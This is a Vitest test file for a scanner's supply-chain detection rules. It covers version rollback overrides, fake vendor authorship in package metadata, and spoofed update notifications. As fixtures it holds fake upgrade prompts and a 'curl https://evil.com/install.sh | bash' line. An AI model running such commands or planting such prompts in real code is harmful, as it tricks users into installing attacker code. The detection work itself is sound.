/**
 * L8, L10, L15 — Supply Chain rules migrated to TypedRuleV2
 * Comprehensive tests: true positives, true negatives, edge cases, evidence chains.
 */
import { describe, it, expect } from "vitest";
import type { AnalysisContext } from "../src/engine.js";
import { getTypedRule } from "../src/rules/base.js";
import "../src/rules/index.js";

function ctx(overrides: Partial<AnalysisContext> = {}): AnalysisContext {
  return {
    server: { id: "t", name: "test", description: null, github_url: null },
    tools: [],
    source_code: null,
    dependencies: [],
    connection_metadata: null,
    ...overrides,
  };
}

function run(id: string, src: string) {
  return getTypedRule(id)!.analyze(ctx({ source_code: src }));
}

// ═══════════════════════════════════════════════════════════════════════════════
// L8 — Version Rollback Attack
// ═══════════════════════════════════════════════════════════════════════════════

describe("L8 — Version Rollback Attack", () => {
  // True positives — JSON overrides
  it("flags overrides pinning to 0.x version", () => {
    const pkg = JSON.stringify({
      name: "my-app",
      overrides: { "mcp-sdk": "0.1.2" },
    });
    const findings = run("L8", pkg);
    expect(findings.some(f => f.rule_id === "L8")).toBe(true);
  });

  it("flags resolutions pinning to 1.0.x", () => {
    const pkg = JSON.stringify({
      name: "my-app",
      resolutions: { "fastmcp": "1.0.3" },
    });
    const findings = run("L8", pkg);
    expect(findings.some(f => f.rule_id === "L8")).toBe(true);
  });

  it("flags pnpm.overrides to old version", () => {
    const pkg = JSON.stringify({
      name: "my-app",
      pnpm: { overrides: { "@modelcontextprotocol/sdk": "0.9.0" } },
    });
    const findings = run("L8", pkg);
    expect(findings.some(f => f.rule_id === "L8")).toBe(true);
  });

  // True positives — install commands in code
  it("flags npm install with old MCP version", () => {
    const src = `execSync("npm install mcp-server@0.2.1");`;
    const findings = run("L8", src);
    expect(findings.some(f => f.rule_id === "L8")).toBe(true);
  });

  // True negatives
  it("does NOT flag overrides to modern version", () => {
    const pkg = JSON.stringify({
      name: "my-app",
      overrides: { "lodash": "4.17.21" },
    });
    const findings = run("L8", pkg);
    expect(findings.filter(f => f.rule_id === "L8").length).toBe(0);
  });

  it("does NOT flag normal package.json without overrides", () => {
    const pkg = JSON.stringify({
      name: "my-app",
      dependencies: { "express": "^4.18.0" },
    });
    const findings = run("L8", pkg);
    expect(findings.filter(f => f.rule_id === "L8").length).toBe(0);
  });

  it("does NOT flag test files", () => {
    const src = `// __tests__/setup.ts\nexecSync("npm install mcp-server@0.1.0");`;
    const findings = run("L8", src);
    expect(findings.filter(f => f.rule_id === "L8").length).toBe(0);
  });

  // Evidence chain
  it("produces evidence chain with MCP-critical flag", () => {
    const pkg = JSON.stringify({
      name: "app",
      overrides: { "mcp-sdk": "0.1.0" },
    });
    const findings = run("L8", pkg);
    const f = findings.find(x => x.rule_id === "L8")!;
    expect(f).toBeDefined();
    expect(f.severity).toBe("critical"); // MCP-critical package

    const chain = f.metadata!.evidence_chain as Record<string, unknown>;
    expect(chain.confidence).toBeGreaterThan(0.4);
    const factors = chain.confidence_factors as Array<{ factor: string }>;
    expect(factors.some(f => f.factor === "mcp_critical_package")).toBe(true);
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// L10 — Registry Metadata Spoofing
// ═══════════════════════════════════════════════════════════════════════════════

describe("L10 — Registry Metadata Spoofing", () => {
  // True positives — JSON metadata
  it("flags author claiming Anthropic", () => {
    const pkg = JSON.stringify({
      name: "mcp-helper",
      author: "Anthropic Team",
    });
    const findings = run("L10", pkg);
    expect(findings.some(f => f.rule_id === "L10")).toBe(true);
  });

  it("flags publisher claiming OpenAI", () => {
    const pkg = JSON.stringify({
      name: "ai-tools",
      publisher: "OpenAI Inc",
    });
    const findings = run("L10", pkg);
    expect(findings.some(f => f.rule_id === "L10")).toBe(true);
  });

  it("flags organization claiming Google", () => {
    const pkg = JSON.stringify({
      name: "search-mcp",
      organization: "Google DeepMind",
    });
    const findings = run("L10", pkg);
    expect(findings.some(f => f.rule_id === "L10")).toBe(true);
  });

  // True positives — AST (property assignment)
  it("flags code setting author to Microsoft", () => {
    const src = `const metadata = { author: "Microsoft Azure Team" };`;
    const findings = run("L10", src);
    expect(findings.some(f => f.rule_id === "L10")).toBe(true);
  });

  // True negatives
  it("does NOT flag independent author", () => {
    const pkg = JSON.stringify({
      name: "my-tool",
      author: "John Developer",
    });
    const findings = run("L10", pkg);
    expect(findings.filter(f => f.rule_id === "L10").length).toBe(0);
  });

  it("does NOT flag package without author field", () => {
    const pkg = JSON.stringify({
      name: "simple-tool",
      description: "A tool",
    });
    const findings = run("L10", pkg);
    expect(findings.filter(f => f.rule_id === "L10").length).toBe(0);
  });

  it("does NOT flag non-author fields mentioning vendors", () => {
    const pkg = JSON.stringify({
      name: "my-tool",
      description: "Integrates with Anthropic Claude API",
    });
    const findings = run("L10", pkg);
    expect(findings.filter(f => f.rule_id === "L10").length).toBe(0);
  });

  it("does NOT flag test files", () => {
    const src = `// __tests__/meta.test.ts\nconst meta = { author: "Anthropic" };`;
    const findings = run("L10", src);
    expect(findings.filter(f => f.rule_id === "L10").length).toBe(0);
  });

  // Evidence chain
  it("produces evidence chain with vendor identification", () => {
    const pkg = JSON.stringify({
      name: "fake-tool",
      author: "Anthropic",
    });
    const findings = run("L10", pkg);
    const f = findings.find(x => x.rule_id === "L10")!;
    expect(f).toBeDefined();

    const chain = f.metadata!.evidence_chain as Record<string, unknown>;
    expect(chain.confidence).toBeGreaterThan(0.3);

    const factors = chain.confidence_factors as Array<{ factor: string; rationale: string }>;
    expect(factors.some(f => f.factor === "vendor_impersonation")).toBe(true);
    expect(factors.find(f => f.factor === "vendor_impersonation")!.rationale).toContain("anthropic");

    expect(chain.threat_reference).toBeDefined();
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// L15 — Update Notification Spoofing
// ═══════════════════════════════════════════════════════════════════════════════

describe("L15 — Update Notification Spoofing", () => {
  // True positives
  it("flags fake update with npm install", () => {
    const src = `
      function showNotification() {
        console.log("Update available! Run: npm install evil-package to upgrade");
      }
    `;
    const findings = run("L15", src);
    expect(findings.some(f => f.rule_id === "L15")).toBe(true);
  });

  it("flags fake upgrade with pip install", () => {
    const src = `
      function notify() {
        const msg = "Upgrade required: pip install malicious-pkg to fix this issue";
        display(msg);
      }
    `;
    const findings = run("L15", src);
    expect(findings.some(f => f.rule_id === "L15")).toBe(true);
  });

  it("flags new version with npx", () => {
    const src = `
      function checkVersion() {
        console.warn("New version available! npx upgrade-tool to install");
      }
    `;
    const findings = run("L15", src);
    expect(findings.some(f => f.rule_id === "L15")).toBe(true);
  });

  it("flags pipe-to-shell with update message", () => {
    const src = `
      function update() {
        const msg = "Update required: curl https://evil.com/install.sh | bash";
        show(msg);
      }
    `;
    const findings = run("L15", src);
    expect(findings.some(f => f.rule_id === "L15")).toBe(true);
  });

  // True negatives
  it("does NOT flag legitimate update-notifier usage", () => {
    const src = `
      const updateNotifier = require('update-notifier');
      function check() {
        const msg = "Update available! Run: npm install my-package to upgrade";
        updateNotifier({ pkg }).notify();
      }
    `;
    const findings = run("L15", src);
    expect(findings.filter(f => f.rule_id === "L15").length).toBe(0);
  });

  it("does NOT flag npm outdated command", () => {
    const src = `
      function checkUpdates() {
        const output = execSync("npm outdated").toString();
        console.log("Update available! Run: npm install lodash to fix");
      }
    `;
    const findings = run("L15", src);
    expect(findings.filter(f => f.rule_id === "L15").length).toBe(0);
  });

  it("does NOT flag code without update notification", () => {
    const src = `
      function install() {
        execSync("npm install express");
      }
    `;
    const findings = run("L15", src);
    expect(findings.filter(f => f.rule_id === "L15").length).toBe(0);
  });

  it("does NOT flag code without install command", () => {
    const src = `
      function notify() {
        console.log("Update available for your application!");
      }
    `;
    const findings = run("L15", src);
    expect(findings.filter(f => f.rule_id === "L15").length).toBe(0);
  });

  it("does NOT flag test files", () => {
    const src = `
      // __tests__/notif.test.ts
      console.log("Update available! Run: npm install evil to upgrade");
    `;
    const findings = run("L15", src);
    expect(findings.filter(f => f.rule_id === "L15").length).toBe(0);
  });

  // Evidence chain
  it("produces evidence chain with notification + command factors", () => {
    const src = `
      function warn() {
        console.log("Update available! Run: npm install new-package to upgrade");
      }
    `;
    const findings = run("L15", src);
    const f = findings.find(x => x.rule_id === "L15")!;
    expect(f).toBeDefined();

    const chain = f.metadata!.evidence_chain as Record<string, unknown>;
    expect(chain.confidence).toBeGreaterThan(0.4);

    const factors = chain.confidence_factors as Array<{ factor: string }>;
    expect(factors.some(f => f.factor === "update_notification")).toBe(true);
    expect(factors.some(f => f.factor === "install_command")).toBe(true);

    const links = chain.links as Array<{ type: string }>;
    expect(links.some(l => l.type === "source")).toBe(true);
    expect(links.some(l => l.type === "sink")).toBe(true);

    expect(chain.threat_reference).toBeDefined();
  });
});
